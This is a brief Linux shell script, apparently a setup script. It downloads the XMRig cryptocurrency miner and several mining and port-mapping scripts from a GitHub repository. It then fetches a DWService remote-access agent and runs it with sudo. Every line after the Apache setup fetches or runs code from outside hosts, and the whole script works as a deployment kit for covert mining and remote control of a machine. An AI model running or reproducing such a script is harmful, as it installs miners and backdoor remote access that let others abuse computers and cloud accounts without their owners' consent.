sudo apt install apache2 python python3 openvpn git unzip wget -y
sudo service apache2 start
cd /home/jbl/Documents/ && wget https://github.com/sanketdon/Mine/blob/main/xmrig-6.15.zip?raw=true 
cd /home/jbl/Documents/ && unzip xmrig-6.15.zip?raw=true && mv xmrig-6.15.zip?raw=true xmrig-6.15
cd /home/jbl/Documents/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/main2.py && chmod 777 main2.py
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/temp.sh && chmod +x temp.sh
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/mine.sh && chmod +x mine.sh
cd /home/jbl/Desktop/ && wget https://raw.githubusercontent.com/sanketdon/Mine/main/portmap.sh && chmod +x portmap.sh
cd /home/jbl/Downloads/ && wget https://www.dwservice.net/download/dwagent_x86.sh && chmod +x dwagent_x86.sh
sudo /home/jbl/Downloads/dwagent_x86.sh
